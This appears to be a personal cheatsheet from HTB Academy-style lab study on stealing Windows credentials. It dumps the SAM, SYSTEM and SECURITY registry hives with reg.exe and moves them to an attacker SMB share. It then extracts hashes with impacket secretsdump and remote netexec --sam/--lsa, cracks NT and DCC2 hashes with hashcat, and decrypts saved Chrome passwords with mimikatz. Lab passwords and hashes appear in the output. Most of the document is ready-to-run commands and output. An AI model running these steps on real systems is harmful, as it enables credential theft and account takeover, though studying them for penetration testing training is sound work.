---
title: Dumping  SAM, SYSTEM, and SECURITY hives
tags:
- privEsc
- windows 
- registry
---
![alt text](../images/secd1.png)

# cheatsheet

  `reg.exe` to save copies of the registry hives:
```cmd-session
> reg.exe save hklm\sam C:\sam.save


> reg.exe save hklm\system C:\system.save

> reg.exe save hklm\security C:\security.save
```

 copy to VM:
- create a smb share on attacking vm
```shell-session
$ impacket-smbserver -smb2support compdata /home/demise/mountshare
```

- move hives to share:
```cmd
C:\> move sam.save \\10.10.15.16\compdata
      

 move security.save \\10.10.15.16\compdata
       

 move system.save \\10.10.15.16\compdata
     
```

```shell-session
$ ls

sam.save  security.save  system.save
```

### dump LSA  hashes remotely
```shell-session
$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
### dump SAM  hashes remotely
```shell-session
$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
### Dump Locally  with impacket
```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

dumping format:
```shell-session
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
```
copy  `NT `hash to a file using nano 
#### crack NT hash with hashcat 

```
$ hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt  -D 1 -O     
```


### cracking DCC2 Hash (from Security hive) 

hashed copies of network credential hashes. An example is:
```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```
The Hashcat mode for cracking DCC2 hashes is `2100`.
```shell-session
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

#### DPAPI Decryption
DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).`
```POWERSHELL
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

This tells us how to interpret the output and which hashes we can attempt to crack.
# Methodology
[] i dog
`SAM` +` SYSTEM` -> hash dump
`SECURITY`  -> cached domain hashes
# Overview
With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.

There are three registry hives we can copy if we have` local administrative` access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
|                 |                                                                                                                                                                   |

# hash differences

| Feature    | SAM (SAM + SYSTEM)            | LSA Secrets (SECURITY)                            |
| ---------- | ----------------------------- | ------------------------------------------------- |
| Focus      | Local account password hashes | Cached credentials & secrets (domain creds, etc.) |
| Format     | NTLM hashes                   | Plaintext or encrypted strings                    |
| Common Use | Crack local user passwords    |                                                   |
We can back up these hives using the `reg.exe` utility.
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save


> reg.exe save hklm\system C:\system.save

> reg.exe save hklm\security C:\security.save
```

# copying to vm
To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`

### DUMPING HASHES
the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.
```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

# DCC2 HASH
This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is `2100`.
DCC2 hashes is approximately `800 times slower` to crack
# DPAPI

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

```POWERSHELL
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

## Remote dumping & LSA secrets considerations

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.
```shell-session
magdy3660@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
[+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a<SNIP>
```
